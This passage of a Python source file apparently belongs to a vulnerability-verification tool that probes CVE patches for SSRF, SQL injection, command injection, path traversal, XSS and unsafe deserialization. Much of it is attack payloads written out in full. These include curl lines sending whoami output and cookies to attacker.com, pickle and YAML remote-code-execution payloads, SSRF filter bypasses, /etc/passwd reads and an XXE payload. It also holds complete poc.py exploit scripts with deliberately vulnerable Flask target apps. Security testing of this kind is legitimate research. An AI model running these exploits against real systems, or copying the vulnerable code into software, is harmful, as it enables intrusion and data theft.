            f'  -d \'{{"url":"http://2130706433:{port}/decimal-probe"}}\'',
        ]

        return {
            "ran":                True,
            "vulnerable_verdict": vuln_r.verdict,
            "patched_verdict":    patched_r.verdict,
            "vulnerable_detail":  vuln_r.verdict_reason,
            "patched_detail":     patched_r.verdict_reason,
            "confirmed":          vuln_r.ssrf_confirmed,
            "poc_payload":        f"http://169.254.169.254/latest/meta-data/ → callback:{port}",
            "detail":             f"vulnerable={vuln_r.verdict}  patched={patched_r.verdict}",
            "curl_commands":      curl_commands,
            "bypass_results":     bypass_rs,
        }
    except Exception as exc:
        return {
            "ran": False, "skip_reason": str(exc), "_error": str(exc),
            "curl_commands": curl_base,
            "bypass_results": _theoretical_ssrf_bypasses(lab_url),
        }


def _live_ssrf_bypasses(lab_url: str, callback_port: int) -> list[dict]:
    """
    Test real SSRF bypass techniques against the PATCHED lab server.
    Switches lab to patched mode, fires each bypass URL, records verdict.
    """
    results = []

    # Switch to patched mode
    try:
        requests.put(f"{lab_url}/mode", json={"mode": "patched"}, timeout=5)
    except Exception:
        pass

    bypasses = [
        {
            "name":      "HTTP Redirect (TOCTOU)",
            "technique": "Public redirector → 302 → private callback. Bypasses IP check because validation happens before redirect is followed.",
            "url":       f"https://httpbin.org/redirect-to?url=http://127.0.0.1:{callback_port}/redirect-probe&status_code=302",
            "curl":      f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"https://httpbin.org/redirect-to?url=http://127.0.0.1:{callback_port}/redirect-probe&status_code=302"}}\'',
        },
        {
            "name":      "IPv6 Loopback",
            "technique": "Use [::1] instead of 127.0.0.1. Some blocklists only check IPv4.",
            "url":       f"http://[::1]:{callback_port}/ipv6-probe",
            "curl":      f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://[::1]:{callback_port}/ipv6-probe"}}\'',
        },
        {
            "name":      "Decimal IP",
            "technique": "127.0.0.1 expressed as integer 2130706433. Parsed by OS, bypasses string-based blocklist.",
            "url":       f"http://2130706433:{callback_port}/decimal-probe",
            "curl":      f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://2130706433:{callback_port}/decimal-probe"}}\'',
        },
        {
            "name":      "Short IP (127.1)",
            "technique": "Abbreviated loopback — resolves to 127.0.0.1 on most OS network stacks.",
            "url":       f"http://127.1:{callback_port}/shortip-probe",
            "curl":      f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://127.1:{callback_port}/shortip-probe"}}\'',
        },
        {
            "name":      "URL-Encoded IP",
            "technique": "Percent-encode the dots: 127%2E0%2E0%2E1. Decoded by HTTP client, bypasses string match.",
            "url":       f"http://127%2E0%2E0%2E1:{callback_port}/encoded-probe",
            "curl":      f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://127%2E0%2E0%2E1:{callback_port}/encoded-probe"}}\'',
        },
    ]

    with CallbackServer() as cb2:
        for b in bypasses:
            verdict = "THEORETICAL"
            blocked = None
            hit     = False
            try:
                resp = requests.post(
                    f"{lab_url}/fetch",
                    json={"url": b["url"]},
                    timeout=6,
                )
                blocked = (resp.status_code == 422)
                hit     = getattr(cb2, "hits", 0) > 0
                if blocked:
                    verdict = "✓ BLOCKED (live)"
                elif hit:
                    verdict = "✗ EXPLOITED (live — bypass confirmed!)"
                else:
                    verdict = f"? INCONCLUSIVE (status={resp.status_code})"
            except Exception as e:
                verdict = f"ERROR: {e}"

            results.append({
                "name":      b["name"],
                "technique": b["technique"],
                "url":       b["url"],
                "curl":      b["curl"],
                "verdict":   verdict,
                "blocked":   blocked,
                "hit":       hit,
                "tested":    True,
            })
            log.info("  [bypass] %-30s → %s", b["name"], verdict)

    return results


def _theoretical_ssrf_bypasses(lab_url: str) -> list[dict]:
    """Return theoretical bypass entries (no live test — lab not reachable)."""
    return [
        {"name": "HTTP Redirect (TOCTOU)",
         "technique": "Public redirector → 302 → private IP. Bypasses pre-fetch IP check.",
         "curl": f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"https://httpbin.org/redirect-to?url=http://169.254.169.254/&status_code=302"}}\'',
         "verdict": "THEORETICAL (lab offline)", "tested": False},
        {"name": "IPv6 Loopback",
         "technique": "Use [::1] — bypasses IPv4-only blocklists.",
         "curl": f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://[::1]/probe"}}\'',
         "verdict": "THEORETICAL (lab offline)", "tested": False},
        {"name": "Decimal IP (2130706433)",
         "technique": "127.0.0.1 as integer — OS resolves it, string checks miss it.",
         "curl": f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://2130706433/probe"}}\'',
         "verdict": "THEORETICAL (lab offline)", "tested": False},
        {"name": "DNS Rebinding",
         "technique": "Domain resolves to public IP on check, rebinds to 127.0.0.1 on fetch.",
         "curl": f'curl -s -X POST "{lab_url}/fetch" -H "Content-Type: application/json" -d \'{{"url":"http://your-rebind-domain.com/probe"}}\'',
         "verdict": "THEORETICAL (lab offline)", "tested": False},
    ]


def _probe_sqli(code_before: str, code_after: str) -> dict:
    """Detect SQLi — string-concat vs parameterised queries."""
    import re
    unsafe_patterns = [
        r'["\'].*\+.*\bWHERE\b',
        r'f["\'].*SELECT.*\{',
        r'%\s*\(.*\)\s*["\']',
        r'\.format\s*\(',
        r'cursor\.execute\s*\(\s*["\'].*\+',
    ]
    safe_patterns = [
        r'cursor\.execute\s*\(\s*["\'].*\?',
        r'cursor\.execute\s*\(\s*["\'].*%s',
        r'cursor\.execute\s*\(\s*["\'].*\$\d',
        r'sqlalchemy.*bindparam',
        r'prepare\s*\(',
    ]

    vuln_hits   = [p for p in unsafe_patterns if re.search(p, code_before, re.I | re.S)]
    patched_ok  = any(re.search(p, code_after, re.I | re.S) for p in safe_patterns)
    vuln_absent = not any(re.search(p, code_after, re.I | re.S) for p in unsafe_patterns)
    confirmed   = bool(vuln_hits) and (patched_ok or vuln_absent)
    poc         = ("' OR '1'='1' --" if vuln_hits else "No injectable pattern found")

    curl_commands = [
        "# Basic authentication bypass",
        "curl -s -X POST 'http://target/login' \\",
        "  -d \"username=' OR '1'='1' --&password=x\"",
        "",
        "# Union-based data extraction",
        "curl -s -G 'http://target/search' \\",
        "  --data-urlencode \"q=' UNION SELECT table_name,2,3 FROM information_schema.tables--\"",
        "",
        "# Time-based blind SQLi (confirm injectable)",
        "curl -s -G 'http://target/search' \\",
        "  --data-urlencode \"q=' AND SLEEP(5)--\"",
        "",
        "# Stacked queries (PostgreSQL/MSSQL)",
        "curl -s -G 'http://target/item' \\",
        "  --data-urlencode \"id=1; DROP TABLE users--\"",
    ]

    bypass_results = [
        {
            "name":      "Comment Stripping Bypass",
            "technique": "Inline /**/ comments between keywords evade simple regex filters.",
            "payload":   "' OR/**/1=1--",
            "curl":      "curl -s -G 'http://target/search' --data-urlencode \"q=' OR/**/1=1--\"",
            "verdict":   "THEORETICAL — test against WAF/patched endpoint",
            "tested":    False,
        },
        {
            "name":      "Case Variation",
            "technique": "Mixed case bypasses case-sensitive keyword filters.",
            "payload":   "' oR '1'='1",
            "curl":      "curl -s -G 'http://target/search' --data-urlencode \"q=' oR '1'='1\"",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "URL Double-Encoding",
            "technique": "Double-encode quotes/spaces — WAF decodes once, app decodes twice.",
            "payload":   "%2527%20OR%25201%253D1--",
            "curl":      "curl -s 'http://target/search?q=%2527%20OR%25201%253D1--'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "Second-Order Injection",
            "technique": "Store payload safely, trigger injection when data is later read and used in a query.",
            "payload":   "Register username: admin'--  → login triggers injection",
            "curl":      "curl -s -X POST 'http://target/register' -d \"username=admin'--&password=x\"",
            "verdict":   "THEORETICAL — requires multi-step interaction",
            "tested":    False,
        },
    ]

    return {
        "ran":                   True,
        "vulnerable_verdict":    "PASS" if vuln_hits else "FAIL",
        "patched_verdict":       "PASS" if (patched_ok or vuln_absent) else "FAIL",
        "confirmed":             confirmed,
        "poc_payload":           poc,
        "unsafe_patterns_found": vuln_hits,
        "curl_commands":         curl_commands,
        "bypass_results":        bypass_results,
        "detail": (
            f"Found {len(vuln_hits)} unsafe SQL pattern(s) in vulnerable version; "
            f"patched uses parameterised queries: {patched_ok}"
        ),
    }


def _probe_cmdi(code_before: str, code_after: str) -> dict:
    """Detect OS command injection via shell=True / os.system / popen patterns."""
    import re, subprocess as sp, tempfile, os as _os

    unsafe = [
        r'os\.system\s*\(',
        r'subprocess\.(run|call|Popen|check_output).*shell\s*=\s*True',
        r'os\.popen\s*\(',
        r'commands\.getoutput\s*\(',
    ]
    safe = [
        r'subprocess\.(run|call|Popen|check_output).*shell\s*=\s*False',
        r'shlex\.split\s*\(',
        r'shlex\.quote\s*\(',
    ]

    vuln_hits  = [p for p in unsafe if re.search(p, code_before, re.I | re.S)]
    patched_ok = any(re.search(p, code_after, re.I | re.S) for p in safe)
    vuln_gone  = not any(re.search(p, code_after, re.I | re.S) for p in unsafe)
    confirmed  = bool(vuln_hits) and (patched_ok or vuln_gone)

    runtime_blocked = None
    if code_after:
        try:
            with tempfile.NamedTemporaryFile(suffix=".py", mode="w",
                                             delete=False, encoding="utf-8") as f:
                f.write(code_after)
                tmp = f.name
            sp.run([sys.executable, "-c",
                    f"import ast; ast.parse(open({tmp!r}).read()); print('parsed')"],
                   capture_output=True, text=True, timeout=5)
            _os.unlink(tmp)
            runtime_blocked = "shell=True" not in code_after
        except Exception:
            runtime_blocked = None

    poc = ("; cat /etc/passwd  OR  && whoami  (shell metacharacter injection)"
           if vuln_hits else "No shell=True pattern found")

    curl_commands = [
        "# Basic command injection via GET parameter",
        "curl -s 'http://target/ping?host=127.0.0.1;id'",
        "",
        "# Pipe to exfiltrate data",
        "curl -s 'http://target/ping?host=127.0.0.1|cat+/etc/passwd'",
        "",
        "# Out-of-band via curl (when output not reflected)",
        "curl -s 'http://target/run?cmd=127.0.0.1%3Bcurl+http://attacker.com/$(whoami)'",
        "",
        "# POST body injection",
        "curl -s -X POST 'http://target/exec' -d 'filename=report.txt;id'",
    ]

    bypass_results = [
        {
            "name":      "IFS Separator Bypass",
            "technique": "Use ${IFS} instead of space — bypasses space-based input filters.",
            "payload":   "127.0.0.1;cat${IFS}/etc/passwd",
            "curl":      "curl -s 'http://target/ping?host=127.0.0.1;cat${IFS}/etc/passwd'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "Newline / Line Feed Bypass",
            "technique": "\\n or %0a acts as command separator — bypasses semicolon filters.",
            "payload":   "127.0.0.1%0aid",
            "curl":      "curl -s 'http://target/ping?host=127.0.0.1%0aid'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "Backtick Subshell",
            "technique": "Backtick subshell executed inline — bypasses simple ; and | filters.",
            "payload":   "127.0.0.1`id`",
            "curl":      "curl -s 'http://target/ping?host=127.0.0.1%60id%60'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "Wildcard Glob Expansion",
            "technique": "Use /* instead of /etc/passwd when path is filtered.",
            "payload":   "127.0.0.1;cat /et?/pass*",
            "curl":      "curl -s -G 'http://target/ping' --data-urlencode 'host=127.0.0.1;cat /et?/pass*'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
    ]

    return {
        "ran":                   True,
        "vulnerable_verdict":    "PASS" if vuln_hits else "FAIL",
        "patched_verdict":       "PASS" if (patched_ok or vuln_gone) else "FAIL",
        "confirmed":             confirmed,
        "poc_payload":           poc,
        "runtime_shell_blocked": runtime_blocked,
        "curl_commands":         curl_commands,
        "bypass_results":        bypass_results,
        "detail": (
            f"Found {len(vuln_hits)} unsafe shell pattern(s); "
            f"patch removes shell=True or adds shlex quoting: {patched_ok or vuln_gone}"
        ),
    }


def _probe_path_traversal(code_before: str, code_after: str) -> dict:
    """Test path traversal — regex patterns + live sandbox escape."""
    import re, os as _os, tempfile

    unsafe = [
        r'open\s*\(\s*[^,)]*\+',
        r'os\.path\.join\s*\([^)]*\+',
        r'pathlib\.Path\s*\([^)]*\+',
    ]
    safe = [
        r'\.resolve\s*\(',
        r'\.is_relative_to\s*\(',
        r'os\.path\.realpath',
        r'\.startswith\s*\(',
        r'\.parts\[',
    ]

    vuln_hits  = [p for p in unsafe if re.search(p, code_before, re.I | re.S)]
    patched_ok = any(re.search(p, code_after, re.I | re.S) for p in safe)

    sandbox_escaped = False
    try:
        with tempfile.TemporaryDirectory() as sandbox:
            safe_base      = _os.path.realpath(sandbox)
            evil_input     = "../../../../etc/passwd"
            joined         = _os.path.realpath(_os.path.join(safe_base, evil_input))
            sandbox_escaped = not joined.startswith(safe_base)
    except Exception:
        pass

    confirmed = bool(vuln_hits) or sandbox_escaped

    curl_commands = [
        "# Classic path traversal — read /etc/passwd",
        "curl -s 'http://target/download?file=../../../../etc/passwd'",
        "",
        "# Windows path traversal",
        "curl -s 'http://target/download?file=..\\..\\..\\windows\\win.ini'",
        "",
        "# Null byte to truncate extension (older PHP/C apps)",
        "curl -s 'http://target/download?file=../../../../etc/passwd%00.jpg'",
        "",
        "# Via file upload path — escape to webroot",
        "curl -s -X POST 'http://target/upload' \\",
        "  -F 'filename=../../shell.php' -F 'file=@shell.php'",
    ]

    bypass_results = [
        {
            "name":      "URL Double-Encoding",
            "technique": "Encode ../ as %252e%252e%252f — WAF decodes once, app decodes twice.",
            "payload":   "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
            "curl":      "curl -s 'http://target/download?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "Unicode Dot Bypass",
            "technique": "Use Unicode fullwidth dots (．．) — normalised by filesystem, missed by string filter.",
            "payload":   "..%c0%af..%c0%afetc%c0%afpasswd",
            "curl":      "curl -s 'http://target/download?file=..%c0%af..%c0%afetc%c0%afpasswd'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "Absolute Path Bypass",
            "technique": "Supply absolute path directly if join() doesn't sanitise leading /.",
            "payload":   "/etc/passwd",
            "curl":      "curl -s 'http://target/download?file=/etc/passwd'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "Sandbox Escape (live runtime test)",
            "technique": "Verified: ../../../../etc/passwd escapes a realpath() sandbox on this OS.",
            "payload":   "../../../../etc/passwd",
            "curl":      "curl -s 'http://target/download?file=../../../../etc/passwd'",
            "verdict":   f"{'✗ ESCAPED (live test)' if sandbox_escaped else '✓ CONTAINED (live test)'}",
            "tested":    True,
        },
    ]

    return {
        "ran":                True,
        "vulnerable_verdict": "PASS" if vuln_hits else "INCONCLUSIVE",
        "patched_verdict":    "PASS" if patched_ok else "FAIL",
        "confirmed":          confirmed,
        "poc_payload":        "filename=../../../../etc/passwd",
        "sandbox_escaped":    sandbox_escaped,
        "curl_commands":      curl_commands,
        "bypass_results":     bypass_results,
        "detail": (
            f"Found {len(vuln_hits)} unsafe path pattern(s); "
            f"patch uses resolve/realpath/startswith: {patched_ok}; "
            f"sandbox escape possible: {sandbox_escaped}"
        ),
    }


def _probe_xss(code_before: str, code_after: str) -> dict:
    """Detect XSS — unescaped output sinks + bypass analysis."""
    import re

    unsafe = [
        r'innerHTML\s*=',
        r'document\.write\s*\(',
        r'render_template_string\s*\(',
        r'Markup\s*\(\s*[^)]*\+',
        r'f["\']<[^"\']*\{',
    ]
    safe = [
        r'html\.escape\s*\(',
        r'escape\s*\(',
        r'bleach\.clean\s*\(',
        r'markupsafe\.escape\s*\(',
        r'Content-Security-Policy',
    ]

    vuln_hits  = [p for p in unsafe if re.search(p, code_before, re.I | re.S)]
    patched_ok = any(re.search(p, code_after, re.I | re.S) for p in safe)
    vuln_gone  = not any(re.search(p, code_after, re.I | re.S) for p in unsafe)
    confirmed  = bool(vuln_hits) and (patched_ok or vuln_gone)
    poc        = '<script>alert(document.cookie)</script>' if vuln_hits else "No XSS sink found"

    curl_commands = [
        "# Reflected XSS via GET parameter",
        "curl -s 'http://target/search?q=<script>alert(document.cookie)</script>'",
        "",
        "# Stored XSS via POST body",
        "curl -s -X POST 'http://target/comment' \\",
        "  -d 'body=<script>fetch(\"http://attacker.com/?\"+document.cookie)</script>'",
        "",
        "# XSS via event handler (bypasses <script> filter)",
        "curl -s 'http://target/search?q=<img+src=x+onerror=alert(1)>'",
        "",
        "# SVG-based XSS",
        "curl -s 'http://target/search?q=<svg+onload=alert(document.domain)>'",
    ]

    bypass_results = [
        {
            "name":      "HTML Entity Encoding",
            "technique": "&#97;lert(1) — HTML entity decoded by browser but missed by text filter.",
            "payload":   "<img src=x onerror=\"&#97;lert(document.cookie)\">",
            "curl":      "curl -s -G 'http://target/search' --data-urlencode 'q=<img src=x onerror=\"&#97;lert(1)\">'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "JavaScript Protocol",
            "technique": "javascript: URI in href/src attributes — executes on click.",
            "payload":   "<a href=\"javascript:alert(document.cookie)\">click</a>",
            "curl":      "curl -s -X POST 'http://target/bio' -d 'website=javascript:alert(1)'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "Template Injection via XSS Sink",
            "technique": "If app uses client-side templates (Angular/Vue), {{7*7}} can escalate to full JS execution.",
            "payload":   "{{constructor.constructor('alert(1)')()}}",
            "curl":      "curl -s -G 'http://target/search' --data-urlencode 'q={{constructor.constructor(\"alert(1)\")()'}}",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "CSP Bypass via JSONP",
            "technique": "If CSP allows a whitelisted domain that has a JSONP endpoint, use it to execute JS.",
            "payload":   "<script src=\"https://trusted.cdn.com/jsonp?callback=alert(1)//\"></script>",
            "curl":      "# Manual — inject via stored XSS, browser executes",
            "verdict":   "THEORETICAL — requires CSP analysis",
            "tested":    False,
        },
    ]

    return {
        "ran":                True,
        "vulnerable_verdict": "PASS" if vuln_hits else "INCONCLUSIVE",
        "patched_verdict":    "PASS" if (patched_ok or vuln_gone) else "FAIL",
        "confirmed":          confirmed,
        "poc_payload":        poc,
        "curl_commands":      curl_commands,
        "bypass_results":     bypass_results,
        "detail": (
            f"Found {len(vuln_hits)} unescaped output sink(s); "
            f"patch adds html.escape/bleach: {patched_ok}"
        ),
    }


def _probe_deserialization(code_before: str, code_after: str) -> dict:
    """Detect unsafe deserialization — pickle, yaml.load, marshal, eval."""
    import re

    unsafe = [
        r'\bpickle\.loads?\s*\(',
        r'\byaml\.load\s*\(',
        r'\beval\s*\(',
        r'\bexec\s*\(',
        r'\bmarshal\.loads?\s*\(',
        r'\bjsonpickle\.decode\s*\(',
    ]
    safe = [
        r'yaml\.safe_load\s*\(',
        r'yaml\.load\s*\(.*Loader\s*=\s*yaml\.SafeLoader',
        r'pickle\.loads?\s*\(.*hmac',
        r'json\.loads?\s*\(',
    ]

    vuln_hits  = [p for p in unsafe if re.search(p, code_before, re.I | re.S)]
    patched_ok = any(re.search(p, code_after, re.I | re.S) for p in safe)
    vuln_gone  = not any(re.search(p, code_after, re.I | re.S) for p in unsafe)
    confirmed  = bool(vuln_hits) and (patched_ok or vuln_gone)

    poc = (
        "python3 -c \"import pickle,os,base64; print(base64.b64encode(pickle.dumps(type('x',(),{'__reduce__':lambda s:(os.system,('id',))})())).decode())\""
        if any("pickle" in h for h in vuln_hits) else
        "yaml_payload: \"!!python/object/apply:os.system ['id']\""
        if any("yaml" in h for h in vuln_hits) else
        "Craft serialised payload for the detected unsafe deserializer"
    )

    curl_commands = [
        "# Send pickle payload via POST body (base64-encoded)",
        "python3 -c \"import pickle,os,base64; payload=pickle.dumps(type('x',(),{'__reduce__':lambda s:(os.system,('id',))})());\\ ",
        "  print(base64.b64encode(payload).decode())\" | \\",
        "  xargs -I{} curl -s -X POST 'http://target/load' -d 'data={}'",
        "",
        "# YAML deserialization RCE",
        "curl -s -X POST 'http://target/import' \\",
        "  -H 'Content-Type: application/x-yaml' \\",
        "  -d '!!python/object/apply:os.system [\"id\"]'",
        "",
        "# Java deserialization via ysoserial (if Java target)",
        "java -jar ysoserial.jar CommonsCollections1 'id' | \\",
        "  curl -s -X POST 'http://target/deserialize' \\",
        "  --data-binary @-",
    ]

    bypass_results = [
        {
            "name":      "HMAC Signature Forgery",
            "technique": "If pickle is HMAC-signed, weak key or timing attack on comparison can bypass signature check.",
            "payload":   "Brute-force or length-extend the HMAC key, then craft signed pickle payload.",
            "curl":      "# Requires offline key attack — no single curl command",
            "verdict":   "THEORETICAL — requires key material",
            "tested":    False,
        },
        {
            "name":      "Class Attribute Smuggling",
            "technique": "Some safe YAML loaders still execute __reduce__ via object reconstruction.",
            "payload":   "!!python/object/apply:subprocess.check_output [['id']]",
            "curl":      "curl -s -X POST 'http://target/import' -H 'Content-Type: application/x-yaml' -d '!!python/object/apply:subprocess.check_output [[\"id\"]]'",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
        {
            "name":      "JSON → Pickle Confusion",
            "technique": "If app accepts JSON but also handles pickle, sending pickle disguised as JSON can bypass content-type check.",
            "payload":   "Send pickle bytes with Content-Type: application/json",
            "curl":      "curl -s -X POST 'http://target/api/load' -H 'Content-Type: application/json' --data-binary @malicious.pkl",
            "verdict":   "THEORETICAL",
            "tested":    False,
        },
    ]

    return {
        "ran":                True,
        "vulnerable_verdict": "PASS" if vuln_hits else "INCONCLUSIVE",
        "patched_verdict":    "PASS" if (patched_ok or vuln_gone) else "FAIL",
        "confirmed":          confirmed,
        "poc_payload":        poc,
        "curl_commands":      curl_commands,
        "bypass_results":     bypass_results,
        "detail": (
            f"Found {len(vuln_hits)} unsafe deserializer(s): {vuln_hits}; "
            f"patch switches to safe equivalent: {patched_ok}"
        ),
    }


def _probe_static_generic(vuln_class: str, code_before: str, code_after: str) -> dict:
    """
    Fallback for vulnerability classes without a dedicated probe.
    Counts changed lines and generates a PoC payload description.
    """
    import difflib
    lines_a = code_before.splitlines()
    lines_b = code_after.splitlines()
    diff    = list(difflib.unified_diff(lines_a, lines_b, lineterm=""))
    removed = [l for l in diff if l.startswith("-") and not l.startswith("---")]
    added   = [l for l in diff if l.startswith("+") and not l.startswith("+++")]

    _POC_MAP = {
        "xxe":             "<?xml version='1.0'?><!DOCTYPE x [<!ENTITY f SYSTEM 'file:///etc/passwd'>]><x>&f;</x>",
        "race condition":  "Hammer the vulnerable endpoint with 50+ concurrent requests to trigger TOCTOU window",
        "use after free":  "Trigger object deallocation then access via dangling pointer (C/C++ target)",
        "buffer overflow": "Supply input exceeding allocated buffer size to overwrite adjacent memory",
        "open redirect":   "?next=https://evil.com — craft redirect to attacker-controlled domain",
        "csrf":            "<form action='/transfer' method='POST'><input name='amount' value='9999'></form>",
        "idor":            "Change /api/users/123/data → /api/users/124/data to access another user's record",
    }
    poc = next(
        (v for k, v in _POC_MAP.items() if k in vuln_class.lower()),
        f"Manual PoC required for {vuln_class} — review the code diff for the exploit entry point",
    )

    return {
        "ran":                True,
        "probe_method":       "static_analysis",
        "vulnerable_verdict": "INCONCLUSIVE" if not code_before else "PASS",
        "patched_verdict":    "INCONCLUSIVE" if not code_after  else "PASS",
        "confirmed":          False,
        "poc_payload":        poc,
        "lines_removed":      len(removed),
        "lines_added":        len(added),
        "detail": (
            f"Static analysis only — no live lab for {vuln_class}. "
            f"Diff: -{len(removed)} lines / +{len(added)} lines. "
            f"Manual verification required."
        ),
    }


# keep old name as alias so cached tool registrations still work
run_ssrf_probe = run_vuln_probe


# ─────────────────────────────────────────────────────────────────────────────
# Stage 3.5 — Exploit artifact generation (poc.py + target_app.py)
# ─────────────────────────────────────────────────────────────────────────────

_POC_TEMPLATE: dict[str, tuple[str, str]] = {
    # (poc.py body, target_app.py body) keyed by vuln class
    "SSRF": (
        '''\
#!/usr/bin/env python3
"""PoC for {cve_id} — Server-Side Request Forgery (SSRF)
Usage: python poc.py [host:port]
Exit : 0=exploited  1=failed
"""
import sys, requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
BASE   = f"http://{{TARGET}}"

def health():
    r = requests.get(f"{{BASE}}/health", timeout=5)
    assert r.status_code == 200, "target unreachable"
    print("[*] Target reachable")

def exploit():
    # Craft SSRF payload pointing to internal metadata / loopback
    payload = {{"url": "http://169.254.169.254/latest/meta-data/"}}
    r = requests.post(f"{{BASE}}/fetch", json=payload, timeout=10)
    return r

def verify(r):
    return r.status_code == 200 and ("ami-id" in r.text or "internal" in r.text.lower())

if __name__ == "__main__":
    health()
    r = exploit()
    if verify(r):
        print(f"[+] EXPLOITED — internal response: {{r.text[:200]}}")
        sys.exit(0)
    print(f"[-] FAILED — status={{r.status_code}} body={{r.text[:100]}}")
    sys.exit(1)
''',
        '''\
#!/usr/bin/env python3
"""Minimal vulnerable target for {cve_id} — SSRF
Run: python target_app.py
Then: python poc.py 127.0.0.1:5000
"""
from flask import Flask, request, jsonify
import requests as _req

app = Flask(__name__)

@app.route("/health")
def health():
    return jsonify({{"status": "ok", "cve": "{cve_id}"}})

@app.route("/fetch", methods=["POST"])
def fetch():
    """Vulnerable: fetches any user-supplied URL without SSRF validation."""
    url = request.json.get("url", "")
    if not url:
        return jsonify({{"error": "url required"}}), 400
    try:
        r = _req.get(url, timeout=3)
        return jsonify({{"status": r.status_code, "body": r.text[:500]}})
    except Exception as e:
        return jsonify({{"error": str(e)}}), 500

if __name__ == "__main__":
    print("Vulnerable SSRF target running on :5000")
    app.run(port=5000, debug=False)
''',
    ),
    "SQLi": (
        '''\
#!/usr/bin/env python3
"""PoC for {cve_id} — SQL Injection
Usage: python poc.py [host:port]
Exit : 0=exploited  1=failed
"""
import sys, requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
BASE   = f"http://{{TARGET}}"

def health():
    r = requests.get(f"{{BASE}}/health", timeout=5)
    assert r.status_code == 200, "target unreachable"
    print("[*] Target reachable")

def exploit():
    # Classic boolean-based blind SQLi bypass
    payload = {{"username": "admin' OR '1'='1", "password": "x"}}
    r = requests.post(f"{{BASE}}/login", json=payload, timeout=10)
    return r

def verify(r):
    body = r.text.lower()
    return r.status_code == 200 and ("welcome" in body or "token" in body or "success" in body)

if __name__ == "__main__":
    health()
    r = exploit()
    if verify(r):
        print(f"[+] EXPLOITED — auth bypass: {{r.text[:200]}}")
        sys.exit(0)
    print(f"[-] FAILED — status={{r.status_code}} body={{r.text[:100]}}")
    sys.exit(1)
''',
        '''\
#!/usr/bin/env python3
"""Minimal vulnerable target for {cve_id} — SQL Injection
Run: python target_app.py
Then: python poc.py 127.0.0.1:5000
"""
from flask import Flask, request, jsonify
import sqlite3, os

app = Flask(__name__)
DB  = "/tmp/vuln_{cve_safe}.db"

def _init_db():
    con = sqlite3.connect(DB)
    con.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT, role TEXT)")
    con.execute("INSERT OR IGNORE INTO users VALUES (1,'admin','secret','admin')")
    con.execute("INSERT OR IGNORE INTO users VALUES (2,'user','pass','user')")
    con.commit(); con.close()

@app.route("/health")
def health():
    return jsonify({{"status": "ok", "cve": "{cve_id}"}})

@app.route("/login", methods=["POST"])
def login():
    """Vulnerable: raw string interpolation in SQL query."""
    data = request.json or {{}}
    u, p = data.get("username",""), data.get("password","")
    con  = sqlite3.connect(DB)
    # VULNERABLE — do NOT use in production
    query = f"SELECT * FROM users WHERE username='{{u}}' AND password='{{p}}'"
    row   = con.execute(query).fetchone()
    con.close()
    if row:
        return jsonify({{"status":"ok","role": row[3],"token":"welcome-" + row[1]}})
    return jsonify({{"status":"fail"}}), 401

if __name__ == "__main__":
    _init_db()
    print("Vulnerable SQLi target running on :5000")
    app.run(port=5000, debug=False)
''',
    ),
    "CMDi": (
        '''\
#!/usr/bin/env python3
"""PoC for {cve_id} — Command Injection
Usage: python poc.py [host:port]
Exit : 0=exploited  1=failed
"""
import sys, requests

TARGET = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1:5000"
BASE   = f"http://{{TARGET}}"

def health():
    r = requests.get(f"{{BASE}}/health", timeout=5)
    assert r.status_code == 200, "target unreachable"
    print("[*] Target reachable")

def exploit():
    # Inject `id` command via semicolon separator
    payload = {{"host": "127.0.0.1; id"}}
    r = requests.post(f"{{BASE}}/ping", json=payload, timeout=10)
    return r

def verify(r):
    return r.status_code == 200 and ("uid=" in r.text or "root" in r.text)

if __name__ == "__main__":
    health()
    r = exploit()
    if verify(r):
        print(f"[+] EXPLOITED — command output: {{r.text[:200]}}")
        sys.exit(0)
    print(f"[-] FAILED — status={{r.status_code}} body={{r.text[:100]}}")
    sys.exit(1)
''',
        '''\
#!/usr/bin/env python3
"""Minimal vulnerable target for {cve_id} — Command Injection
Run: python target_app.py
Then: python poc.py 127.0.0.1:5000
"""
from flask import Flask, request, jsonify
import subprocess

app = Flask(__name__)

@app.route("/health")
def health():
    return jsonify({{"status": "ok", "cve": "{cve_id}"}})

@app.route("/ping", methods=["POST"])
def ping():
    """Vulnerable: passes user input directly to shell."""
    host = request.json.get("host", "127.0.0.1")
    # VULNERABLE — shell=True + unsanitised input
    result = subprocess.run(f"ping -c 1 {{host}}", shell=True,
                            capture_output=True, text=True, timeout=5)
    return jsonify({{"stdout": result.stdout, "stderr": result.stderr}})

if __name__ == "__main__":
    print("Vulnerable CMDi target running on :5000")
    app.run(port=5000, debug=False)
''',
    ),
    "XSS": (
        '''\
#!/usr/bin/env python3
"""PoC for {cve_id} — Cross-Site Scripting (XSS)
Usage: python poc.py [host:port]
Exit : 0=exploited  1=failed
